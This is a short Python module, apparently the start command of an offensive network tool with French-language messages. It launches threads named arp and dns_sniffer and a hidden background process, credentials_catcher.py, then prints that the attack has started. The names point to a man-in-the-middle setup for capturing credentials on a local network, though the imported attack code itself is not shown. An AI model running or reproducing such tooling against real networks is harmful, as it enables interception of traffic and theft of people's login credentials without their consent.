import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'corethreads')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
import threading
import subprocess
from corethreads.arp import arp
from corethreads.dns_listen import dns_sniffer

def start_command(params):

	if ATTACK_STATUS['status'] == 0 and ATTACK_STATUS['wspid'] == 0:

		ATTACK_STATUS['status'] = 1

		thread1 = threading.Thread(target=arp)
		thread2 = threading.Thread(target=dns_sniffer)
		thread1.start()
		thread2.start()

		process = subprocess.Popen(["python3", "corethreads/credentials_catcher.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
		ATTACK_STATUS['wspid'] = process.pid

		print("Démarrage de l'attaque")


	else:

		print("Attaque déja démarrée");
